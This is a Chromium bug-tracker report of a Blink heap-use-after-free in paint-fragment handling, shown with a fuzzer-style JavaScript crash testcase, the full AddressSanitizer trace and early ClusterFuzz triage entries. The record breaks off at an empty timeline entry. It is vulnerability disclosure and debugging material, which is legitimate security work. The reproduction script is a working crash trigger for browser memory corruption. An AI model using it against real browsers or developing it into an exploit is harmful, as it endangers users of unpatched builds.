# Security: heap-use-after-free in blink::NGPaintFragment::AssociateWithLayoutObject

| Field | Value |
|-------|-------|
| **Issue ID** | [40095442](https://issues.chromium.org/issues/40095442) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>Layout, Blink>Paint |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cl...@gmail.com |
| **Assignee** | ko...@chromium.org |
| **Created** | 2019-06-19 |
| **Bounty** | $3,000.00 |

## Description

**-------------------------**

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build of content\_shell

**VERSION**  

Chrome Version: asan-linux-release-670550  

Operating System: Linux 64bit

**REPRODUCTION CASE**

<script>
function start() {
o168=document.createElement('H3');
o323=document.createElement('SPAN');
o337=document.createElement('DIV');
o547=document.createElement('marquee');
o547.setAttribute('id','id7');
o667=document.createElement('td');
o671=document.createElement('canvas');
o671.setAttribute('id','id9');
o697=o547.cloneNode(false);
o806=window.getSelection();
document.documentElement.appendChild(o168);
document.documentElement.appendChild(o671);
document.documentElement.appendChild(o667);
o858=document.createElement('div');
o858.innerHTML="<svg><defs><font-face><font-face-src><font-face-uri><g><defs><font><font-face><missing-glyph>";
o859=o858.firstChild.getElementsByTagName('\\*');
o894=o859[5];
o896=o859[8];
s50=unescape('%u2067%20a');
o906=o168.insertAdjacentText('beforebegin',s50);
document.documentElement.appendChild(o697);
o1007=document.createElement('style');
o667.appendChild(o1007);
document.documentElement.appendChild(o894);
o1025=document.createTextNode("\\*{ float: left");
o1007.appendChild(o1025);
document.documentElement.appendChild(o323);
o1054=document.createElement('style');
o1055=document.createTextNode("{}#id7{ margin: 32 3197cm 497rem}#id9{ -webkit-writing-mode: vertical-lr");
o1054.appendChild(o1055);
o896.appendChild(o1054);
o1161=document.createElement('style');
o1162=document.createTextNode("\\*{ all: inherit");
o1161.appendChild(o1162);
document.documentElement.appendChild(o1161);
document.documentElement.style.zoom='0.00001';
document.documentElement.ownerDocument.execCommand('inserthtml',false,'');
o1195=o337.append(o1161);
try{o806.collapseToStart();}catch(e){}
o1205=document.documentElement.append('x');
}
</script>
<body onload="start()"></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

=================================================================  

==16370==ERROR: AddressSanitizer: heap-use-after-free on address 0x60800002e760 at pc 0x55603cc1dc8c bp 0x7ffdbcfd1d30 sp 0x7ffdbcfd1d28  

READ of size 8 at 0x60800002e760 thread T0 (content\_shell)  

#0 0x55603cc1dc8b in LastForSameLayoutObject third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:578:20  

#1 0x55603cc1dc8b in blink::NGPaintFragment::AssociateWithLayoutObject(blink::LayoutObject\*, WTF::HashMap<blink::LayoutObject const\*, blink::NGPaintFragment\*, WTF::PtrHash<blink::LayoutObject const>, WTF::HashTraits<blink::LayoutObject const\*>, WTF::HashTraits[blink::NGPaintFragment\\*](javascript:void(0);), WTF::PartitionAllocator>\*) third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:486  

#2 0x55603cc1c3dd in blink::NGPaintFragment::PopulateDescendants(blink::NGPaintFragment::CreateContext\*) third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:432:16  

#3 0x55603cc1c4ac in blink::NGPaintFragment::PopulateDescendants(blink::NGPaintFragment::CreateContext\*) third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:445:16  

#4 0x55603cc1b3dc in blink::NGPaintFragment::Create(scoped\_refptr<blink::NGPhysicalFragment const>, blink::NGBlockBreakToken const\*, scoped\_refptr[blink::NGPaintFragment](javascript:void(0);)) third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:347:21  

#5 0x55603c684ae2 in blink::LayoutNGMixin[blink::LayoutBlockFlow](javascript:void(0);)::SetPaintFragment(blink::NGBlockBreakToken const\*, scoped\_refptr<blink::NGPhysicalFragment const>) third\_party/blink/renderer/core/layout/ng/layout\_ng\_mixin.cc:276:16  

#6 0x55603c6a79c9 in blink::NGBlockNode::FinishLayout(blink::LayoutBlockFlow\*, blink::NGConstraintSpace const&, blink::NGBreakToken const\*, scoped\_refptr<blink::NGLayoutResult const>) third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:435:19  

#7 0x55603c6a3209 in blink::NGBlockNode::Layout(blink::NGConstraintSpace const&, blink::NGBreakToken const\*) third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:273:3  

#8 0x55603c67279a in blink::LayoutNGBlockFlow::UpdateBlockLayout(bool) third\_party/blink/renderer/core/layout/ng/layout\_ng\_block\_flow.cc:46:25  

#9 0x55603c0f76be in blink::LayoutBlock::UpdateLayout() third\_party/blink/renderer/core/layout/layout\_block.cc:429:3  

#10 0x55603c151b2a in blink::LayoutBlockFlow::PositionAndLayoutFloat(blink::FloatingObject&, blink::LayoutUnit) third\_party/blink/renderer/core/layout/layout\_block\_flow.cc:3919:13  

#11 0x55603c140a37 in blink::LayoutBlockFlow::PlaceNewFloats(blink::LayoutUnit, blink::LineWidth\*) third\_party/blink/renderer/core/layout/layout\_block\_flow.cc:3862:9  

#12 0x55603c54d429 in PlaceNewFloats third\_party/blink/renderer/core/layout/api/line\_layout\_block\_flow.h:131:27  

#13 0x55603c54d429 in blink::LineBreaker::SkipLeadingWhitespace(blink::BidiResolver<blink::InlineIterator, blink::BidiRun, blink::BidiIsolatedRun>&, blink::LineInfo&, blink::LineWidth&) third\_party/blink/renderer/core/layout/line/line\_breaker.cc:48  

#14 0x55603c54e30a in blink::LineBreaker::NextLineBreak(blink::BidiResolver<blink::InlineIterator, blink::BidiRun, blink::BidiIsolatedRun>&, blink::LineInfo&, blink::LayoutTextInfo&, WTF::Vector<blink::WordMeasurement, 64u, WTF::PartitionAllocator>&) third\_party/blink/renderer/core/layout/line/line\_breaker.cc:78:3  

#15 0x55603c18374e in blink::LayoutBlockFlow::LayoutRunsAndFloatsInRange(blink::LineLayoutState&, blink::BidiResolver<blink::InlineIterator, blink::BidiRun, blink::BidiIsolatedRun>&, blink::InlineIterator const&, blink::BidiStatus const&) third\_party/blink/renderer/core/layout/layout\_block\_flow\_line.cc:1124:22  

#16 0x55603c17fc28 in blink::LayoutBlockFlow::LayoutRunsAndFloats(blink::LineLayoutState&) third\_party/blink/renderer/core/layout/layout\_block\_flow\_line.cc:1003:3  

#17 0x55603c194238 in blink::LayoutBlockFlow::LayoutInlineChildren(bool, blink::LayoutUnit) third\_party/blink/renderer/core/layout/layout\_block\_flow\_line.cc:2010:5  

#18 0x55603c121e44 in blink::LayoutBlockFlow::LayoutChildren(bool, blink::SubtreeLayoutScope&) third\_party/blink/renderer/core/layout/layout\_block\_flow.cc:621:5  

#19 0x55603c1203ba in blink::LayoutBlockFlow::UpdateBlockLayout(bool) third\_party/blink/renderer/core/layout/layout\_block\_flow.cc:484:5  

#20 0x55603c4f488d in blink::LayoutView::UpdateBlockLayout(bool) third\_party/blink/renderer/core/layout/layout\_view.cc:301:20  

#21 0x55603c0f76be in blink::LayoutBlock::UpdateLayout() third\_party/blink/renderer/core/layout/layout\_block.cc:429:3  

#22 0x55603c4f522a in blink::LayoutView::UpdateLayout() third\_party/blink/renderer/core/layout/layout\_view.cc:339:20  

#23 0x55603b4fd8c4 in blink::LocalFrameView::PerformLayout(bool) third\_party/blink/renderer/core/frame/local\_frame\_view.cc:709:24  

#24 0x55603b4f95a7 in blink::LocalFrameView::UpdateLayout() third\_party/blink/renderer/core/frame/local\_frame\_view.cc:847:5  

#25 0x55603aba2e83 in blink::Document::UpdateStyleAndLayout(blink::Document::ForcedLayoutStatus) third\_party/blink/renderer/core/dom/document.cc:2543:17  

#26 0x55603aba29ce in blink::Document::UpdateStyleAndLayoutForNode(blink::Node const\*) third\_party/blink/renderer/core/dom/document.cc:2518:3  

#27 0x55603a4ec933 in blink::CSSComputedStyleDeclaration::GetPropertyCSSValue(blink::CSSProperty const&) const third\_party/blink/renderer/core/css/css\_computed\_style\_declaration.cc:391:14  

#28 0x55603a4eeb10 in GetPropertyValue third\_party/blink/renderer/core/css/css\_computed\_style\_declaration.cc:418:27  

#29 0x55603a4eeb10 in blink::CSSComputedStyleDeclaration::getPropertyValue(WTF::String const&) third\_party/blink/renderer/core/css/css\_computed\_style\_declaration.cc:496  

#30 0x55603b9c225b in blink::HTMLMarqueeElement::GetMetrics() third\_party/blink/renderer/core/html/html\_marquee\_element.cc:366:40  

#31 0x55603b9bbff1 in blink::HTMLMarqueeElement::GetAnimationParameters() third\_party/blink/renderer/core/html/html\_marquee\_element.cc:383:21  

#32 0x55603b9bab96 in blink::HTMLMarqueeElement::ContinueAnimation() third\_party/blink/renderer/core/html/html\_marquee\_element.cc:277:36  

#33 0x55603ae4e64b in blink::FrameRequestCallbackCollection::ExecuteCallbacksInternal(blink::HeapVector<blink::Member[blink::FrameRequestCallbackCollection::FrameCallback](javascript:void(0);), 0u>&, char const\*, char const\*, double, double) third\_party/blink/renderer/core/dom/frame\_request\_callback\_collection.cc  

#34 0x55603ae44379 in ExecuteFrameCallbacks third\_party/blink/renderer/core/dom/scripted\_animation\_controller.cc:148:24  

#35 0x55603ae44379 in blink::ScriptedAnimationController::ServiceScriptedAnimations(base::TimeTicks) third\_party/blink/renderer/core/dom/scripted\_animation\_controller.cc:191  

#36 0x55603abe54dd in blink::Document::ServiceScriptedAnimations(base::TimeTicks) third\_party/blink/renderer/core/dom/document.cc:7083:35  

#37 0x55603ca4cc67 in blink::PageAnimator::ServiceScriptedAnimations(base::TimeTicks) third\_party/blink/renderer/core/page/page\_animator.cc:81:15  

#38 0x55603b222783 in blink::WebViewImpl::BeginFrame(base::TimeTicks, bool) third\_party/blink/renderer/core/exported/web\_view\_impl.cc:1508:3  

#39 0x55604079a67b in content::RenderWidget::BeginMainFrame(base::TimeTicks) content/renderer/render\_widget.cc:1114:19  

#40 0x556038380318 in cc::ProxyMain::BeginMainFrame(std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >) cc/trees/proxy\_main.cc:227:21  

#41 0x5560383948d1 in Invoke<void (cc::ProxyMain::\*)(std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), base::WeakPtr[cc::ProxyMain](javascript:void(0);), std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > base/bind\_internal.h:499:12  

#42 0x5560383948d1 in MakeItSo<void (cc::ProxyMain::\*)(std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), base::WeakPtr[cc::ProxyMain](javascript:void(0);), std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > base/bind\_internal.h:619  

#43 0x5560383948d1 in void base::internal::Invoker<base::internal::BindState<void (cc::ProxyMain::\*)(std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), base::WeakPtr[cc::ProxyMain](javascript:void(0);), base::internal::PassedWrapper<std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > >, void ()>::RunImpl<void (cc::ProxyMain::\*)(std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), std::\_\_1::tuple<base::WeakPtr[cc::ProxyMain](javascript:void(0);), base::internal::PassedWrapper<std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > >, 0ul, 1ul>(void (cc::ProxyMain::\*&&)(std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), std::\_\_1::tuple<base::WeakPtr[cc::ProxyMain](javascript:void(0);), base::internal::PassedWrapper<std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > >&&, std::\_\_1::integer\_sequence<unsigned long, 0ul, 1ul>) base/bind\_internal.h:672  

#44 0x55603443a472 in Run base/callback.h:97:12  

#45 0x55603443a472 in base::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/task/common/task\_annotator.cc:142  

#46 0x556034471c57 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence\_manager::LazyNow\*, bool\*) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:368:23  

#47 0x556034471207 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork() base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:219:7  

#48 0x55603439e1b0 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:39:55  

#49 0x556034473c8e in Run base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:466:12  

#50 0x556034473c8e in non-virtual thunk to base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc  

#51 0x5560343fa32c in base::RunLoop::RunWithTimeout(base::TimeDelta) base/run\_loop.cc:163:14  

#52 0x5560407f6fcd in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:208:16  

#53 0x556031fbfdce in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:519:14  

#54 0x556031fc34bb in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:876:10  

#55 0x55603927ee80 in service\_manager::Main(service\_manager::MainParams const&) services/service\_manager/embedder/main.cc:422:29  

#56 0x55602f3155c4 in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:10  

#57 0x55602cd73b0b in main content/shell/app/shell\_main.cc:43:10  

#58 0x7f75a09cab96 in \_\_libc\_start\_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310

0x60800002e760 is located 64 bytes inside of 96-byte region [0x60800002e720,0x60800002e780)  

freed by thread T0 (content\_shell) here:  

#0 0x55602cd4846d in \_\_interceptor\_free /b/swarming/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:123:3  

#1 0x55603cc1a71c in DeleteInternal[blink::NGPaintFragment](javascript:void(0);) third\_party/blink/renderer/platform/wtf/ref\_counted.h:54:5  

#2 0x55603cc1a71c in Destruct third\_party/blink/renderer/platform/wtf/ref\_counted.h:35  

#3 0x55603cc1a71c in Release base/memory/ref\_counted.h:345  

#4 0x55603cc1a71c in Release base/memory/scoped\_refptr.h:297  

#5 0x55603cc1a71c in ~scoped\_refptr base/memory/scoped\_refptr.h:209  

#6 0x55603cc1a71c in blink::NGPaintFragment::CreateOrReuse(scoped\_refptr<blink::NGPhysicalFragment const>, blink::PhysicalOffset, blink::NGPaintFragment::CreateContext\*) third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:322  

#7 0x55603cc1c2c4 in blink::NGPaintFragment::PopulateDescendants(blink::NGPaintFragment::CreateContext\*) third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:425:44  

#8 0x55603cc1c4ac in blink::NGPaintFragment::PopulateDescendants(blink::NGPaintFragment::CreateContext\*) third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:445:16  

#9 0x55603cc1b3dc in blink::NGPaintFragment::Create(scoped\_refptr<blink::NGPhysicalFragment const>, blink::NGBlockBreakToken const\*, scoped\_refptr[blink::NGPaintFragment](javascript:void(0);)) third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:347:21  

#10 0x55603c684ae2 in blink::LayoutNGMixin[blink::LayoutBlockFlow](javascript:void(0);)::SetPaintFragment(blink::NGBlockBreakToken const\*, scoped\_refptr<blink::NGPhysicalFragment const>) third\_party/blink/renderer/core/layout/ng/layout\_ng\_mixin.cc:276:16  

#11 0x55603c6a79c9 in blink::NGBlockNode::FinishLayout(blink::LayoutBlockFlow\*, blink::NGConstraintSpace const&, blink::NGBreakToken const\*, scoped\_refptr<blink::NGLayoutResult const>) third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:435:19  

#12 0x55603c6a3209 in blink::NGBlockNode::Layout(blink::NGConstraintSpace const&, blink::NGBreakToken const\*) third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:273:3  

#13 0x55603c67279a in blink::LayoutNGBlockFlow::UpdateBlockLayout(bool) third\_party/blink/renderer/core/layout/ng/layout\_ng\_block\_flow.cc:46:25  

#14 0x55603c0f76be in blink::LayoutBlock::UpdateLayout() third\_party/blink/renderer/core/layout/layout\_block.cc:429:3  

#15 0x55603c151b2a in blink::LayoutBlockFlow::PositionAndLayoutFloat(blink::FloatingObject&, blink::LayoutUnit) third\_party/blink/renderer/core/layout/layout\_block\_flow.cc:3919:13  

#16 0x55603c140a37 in blink::LayoutBlockFlow::PlaceNewFloats(blink::LayoutUnit, blink::LineWidth\*) third\_party/blink/renderer/core/layout/layout\_block\_flow.cc:3862:9  

#17 0x55603c54d429 in PlaceNewFloats third\_party/blink/renderer/core/layout/api/line\_layout\_block\_flow.h:131:27  

#18 0x55603c54d429 in blink::LineBreaker::SkipLeadingWhitespace(blink::BidiResolver<blink::InlineIterator, blink::BidiRun, blink::BidiIsolatedRun>&, blink::LineInfo&, blink::LineWidth&) third\_party/blink/renderer/core/layout/line/line\_breaker.cc:48  

#19 0x55603c54e30a in blink::LineBreaker::NextLineBreak(blink::BidiResolver<blink::InlineIterator, blink::BidiRun, blink::BidiIsolatedRun>&, blink::LineInfo&, blink::LayoutTextInfo&, WTF::Vector<blink::WordMeasurement, 64u, WTF::PartitionAllocator>&) third\_party/blink/renderer/core/layout/line/line\_breaker.cc:78:3  

#20 0x55603c18374e in blink::LayoutBlockFlow::LayoutRunsAndFloatsInRange(blink::LineLayoutState&, blink::BidiResolver<blink::InlineIterator, blink::BidiRun, blink::BidiIsolatedRun>&, blink::InlineIterator const&, blink::BidiStatus const&) third\_party/blink/renderer/core/layout/layout\_block\_flow\_line.cc:1124:22  

#21 0x55603c17fc28 in blink::LayoutBlockFlow::LayoutRunsAndFloats(blink::LineLayoutState&) third\_party/blink/renderer/core/layout/layout\_block\_flow\_line.cc:1003:3  

#22 0x55603c194238 in blink::LayoutBlockFlow::LayoutInlineChildren(bool, blink::LayoutUnit) third\_party/blink/renderer/core/layout/layout\_block\_flow\_line.cc:2010:5  

#23 0x55603c121e44 in blink::LayoutBlockFlow::LayoutChildren(bool, blink::SubtreeLayoutScope&) third\_party/blink/renderer/core/layout/layout\_block\_flow.cc:621:5  

#24 0x55603c1203ba in blink::LayoutBlockFlow::UpdateBlockLayout(bool) third\_party/blink/renderer/core/layout/layout\_block\_flow.cc:484:5  

#25 0x55603c4f488d in blink::LayoutView::UpdateBlockLayout(bool) third\_party/blink/renderer/core/layout/layout\_view.cc:301:20  

#26 0x55603c0f76be in blink::LayoutBlock::UpdateLayout() third\_party/blink/renderer/core/layout/layout\_block.cc:429:3  

#27 0x55603c4f522a in blink::LayoutView::UpdateLayout() third\_party/blink/renderer/core/layout/layout\_view.cc:339:20  

#28 0x55603b4fd8c4 in blink::LocalFrameView::PerformLayout(bool) third\_party/blink/renderer/core/frame/local\_frame\_view.cc:709:24  

#29 0x55603b4f95a7 in blink::LocalFrameView::UpdateLayout() third\_party/blink/renderer/core/frame/local\_frame\_view.cc:847:5  

#30 0x55603abadeaa in blink::Document::ImplicitClose() third\_party/blink/renderer/core/dom/document.cc:3495:15  

#31 0x55603abaecc2 in blink::Document::CheckCompletedInternal() third\_party/blink/renderer/core/dom/document.cc:3595:5  

#32 0x55603abad94d in blink::Document::CheckCompleted() third\_party/blink/renderer/core/dom/document.cc:3571:7  

#33 0x55603c8984c0 in blink::FrameLoader::FinishedParsing() third\_party/blink/renderer/core/loader/frame\_loader.cc:351:26  

#34 0x55603abd5e65 in blink::Document::FinishedParsing() third\_party/blink/renderer/core/dom/document.cc:6162:21  

#35 0x55603bb64327 in end third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:905:18  

#36 0x55603bb64327 in blink::HTMLDocumentParser::AttemptToRunDeferredScriptsAndEnd() third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:920

previously allocated by thread T0 (content\_shell) here:  

#0 0x55602cd486ed in \_\_interceptor\_malloc /b/swarming/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:145:3  

#1 0x55603cc1a726 in PartitionAllocGenericFlags base/allocator/partition\_allocator/partition\_alloc.h:402:48  

#2 0x55603cc1a726 in Alloc base/allocator/partition\_allocator/partition\_alloc.h:437  

#3 0x55603cc1a726 in FastMalloc third\_party/blink/renderer/platform/wtf/allocator/partitions.h:118  

#4 0x55603cc1a726 in operator new third\_party/blink/renderer/platform/wtf/ref\_counted.h:44  

#5 0x55603cc1a726 in blink::NGPaintFragment::CreateOrReuse(scoped\_refptr<blink::NGPhysicalFragment const>, blink::PhysicalOffset, blink::NGPaintFragment::CreateContext\*) third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:325  

#6 0x55603cc1c2c4 in blink::NGPaintFragment::PopulateDescendants(blink::NGPaintFragment::CreateContext\*) third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:425:44  

#7 0x55603cc1c4ac in blink::NGPaintFragment::PopulateDescendants(blink::NGPaintFragment::CreateContext\*) third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:445:16  

#8 0x55603cc1b3dc in blink::NGPaintFragment::Create(scoped\_refptr<blink::NGPhysicalFragment const>, blink::NGBlockBreakToken const\*, scoped\_refptr[blink::NGPaintFragment](javascript:void(0);)) third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:347:21  

#9 0x55603c684ae2 in blink::LayoutNGMixin[blink::LayoutBlockFlow](javascript:void(0);)::SetPaintFragment(blink::NGBlockBreakToken const\*, scoped\_refptr<blink::NGPhysicalFragment const>) third\_party/blink/renderer/core/layout/ng/layout\_ng\_mixin.cc:276:16  

#10 0x55603c6a79c9 in blink::NGBlockNode::FinishLayout(blink::LayoutBlockFlow\*, blink::NGConstraintSpace const&, blink::NGBreakToken const\*, scoped\_refptr<blink::NGLayoutResult const>) third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:435:19  

#11 0x55603c6a3209 in blink::NGBlockNode::Layout(blink::NGConstraintSpace const&, blink::NGBreakToken const\*) third\_party/blink/renderer/core/layout/ng/ng\_block\_node.cc:273:3  

#12 0x55603c67279a in blink::LayoutNGBlockFlow::UpdateBlockLayout(bool) third\_party/blink/renderer/core/layout/ng/layout\_ng\_block\_flow.cc:46:25  

#13 0x55603c0f76be in blink::LayoutBlock::UpdateLayout() third\_party/blink/renderer/core/layout/layout\_block.cc:429:3  

#14 0x55603c151b2a in blink::LayoutBlockFlow::PositionAndLayoutFloat(blink::FloatingObject&, blink::LayoutUnit) third\_party/blink/renderer/core/layout/layout\_block\_flow.cc:3919:13  

#15 0x55603c140a37 in blink::LayoutBlockFlow::PlaceNewFloats(blink::LayoutUnit, blink::LineWidth\*) third\_party/blink/renderer/core/layout/layout\_block\_flow.cc:3862:9  

#16 0x55603c54d429 in PlaceNewFloats third\_party/blink/renderer/core/layout/api/line\_layout\_block\_flow.h:131:27  

#17 0x55603c54d429 in blink::LineBreaker::SkipLeadingWhitespace(blink::BidiResolver<blink::InlineIterator, blink::BidiRun, blink::BidiIsolatedRun>&, blink::LineInfo&, blink::LineWidth&) third\_party/blink/renderer/core/layout/line/line\_breaker.cc:48  

#18 0x55603c54e30a in blink::LineBreaker::NextLineBreak(blink::BidiResolver<blink::InlineIterator, blink::BidiRun, blink::BidiIsolatedRun>&, blink::LineInfo&, blink::LayoutTextInfo&, WTF::Vector<blink::WordMeasurement, 64u, WTF::PartitionAllocator>&) third\_party/blink/renderer/core/layout/line/line\_breaker.cc:78:3  

#19 0x55603c18374e in blink::LayoutBlockFlow::LayoutRunsAndFloatsInRange(blink::LineLayoutState&, blink::BidiResolver<blink::InlineIterator, blink::BidiRun, blink::BidiIsolatedRun>&, blink::InlineIterator const&, blink::BidiStatus const&) third\_party/blink/renderer/core/layout/layout\_block\_flow\_line.cc:1124:22  

#20 0x55603c17fc28 in blink::LayoutBlockFlow::LayoutRunsAndFloats(blink::LineLayoutState&) third\_party/blink/renderer/core/layout/layout\_block\_flow\_line.cc:1003:3  

#21 0x55603c194238 in blink::LayoutBlockFlow::LayoutInlineChildren(bool, blink::LayoutUnit) third\_party/blink/renderer/core/layout/layout\_block\_flow\_line.cc:2010:5  

#22 0x55603c121e44 in blink::LayoutBlockFlow::LayoutChildren(bool, blink::SubtreeLayoutScope&) third\_party/blink/renderer/core/layout/layout\_block\_flow.cc:621:5  

#23 0x55603c1203ba in blink::LayoutBlockFlow::UpdateBlockLayout(bool) third\_party/blink/renderer/core/layout/layout\_block\_flow.cc:484:5  

#24 0x55603c4f488d in blink::LayoutView::UpdateBlockLayout(bool) third\_party/blink/renderer/core/layout/layout\_view.cc:301:20  

#25 0x55603c0f76be in blink::LayoutBlock::UpdateLayout() third\_party/blink/renderer/core/layout/layout\_block.cc:429:3  

#26 0x55603c4f522a in blink::LayoutView::UpdateLayout() third\_party/blink/renderer/core/layout/layout\_view.cc:339:20  

#27 0x55603b4fd8c4 in blink::LocalFrameView::PerformLayout(bool) third\_party/blink/renderer/core/frame/local\_frame\_view.cc:709:24  

#28 0x55603b4f95a7 in blink::LocalFrameView::UpdateLayout() third\_party/blink/renderer/core/frame/local\_frame\_view.cc:847:5  

#29 0x55603aba2e83 in blink::Document::UpdateStyleAndLayout(blink::Document::ForcedLayoutStatus) third\_party/blink/renderer/core/dom/document.cc:2543:17  

#30 0x55603b012dfb in blink::FrameSelection::ComputeVisibleSelectionInDOMTreeDeprecated() const third\_party/blink/renderer/core/editing/frame\_selection.cc:152:17  

#31 0x55603afb43e4 in blink::DOMSelection::rangeCount() const third\_party/blink/renderer/core/editing/dom\_selection.cc:214:12  

#32 0x55603afb5a70 in blink::DOMSelection::collapseToStart(blink::ExceptionState&) third\_party/blink/renderer/core/editing/dom\_selection.cc:319:7  

#33 0x556039770b07 in CollapseToStartMethod gen/third\_party/blink/renderer/bindings/core/v8/v8\_selection.cc:301:9  

#34 0x556039770b07 in blink::V8Selection::CollapseToStartMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) gen/third\_party/blink/renderer/bindings/core/v8/v8\_selection.cc:639  

#35 0x55602faf5b28 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) v8/src/api/api-arguments-inl.h:158:3

SUMMARY: AddressSanitizer: heap-use-after-free third\_party/blink/renderer/core/paint/ng/ng\_paint\_fragment.cc:578:20 in LastForSameLayoutObject  

Shadow bytes around the buggy address:  

0x0c107fffdc90: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c107fffdca0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c107fffdcb0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c107fffdcc0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c107fffdcd0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

=>0x0c107fffdce0: fa fa fa fa fd fd fd fd fd fd fd fd[fd]fd fd fd  

0x0c107fffdcf0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c107fffdd00: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c107fffdd10: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c107fffdd20: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 06 fa  

0x0c107fffdd30: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==16370==ABORTING

## Timeline

### cl...@chromium.org (2019-06-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6280200895201280.

### me...@chromium.org (2019-06-20)

Thanks for the report, I'll try to repro this on clusterfuzz.

[Monorail components: Blink>Paint]

### cl...@chromium.org (2019-06-20)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/chromium/src/+/84e53e8aaeac92bd520fe3f472137edbb4b4dbb8 ([LayoutNG] Fix excessive |NeedsCollectInlines|).

If this is incorrect, please let us know why and apply the Test-Predator-Wrong-CLs label. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### cl...@chromium.org (2019-06-20)

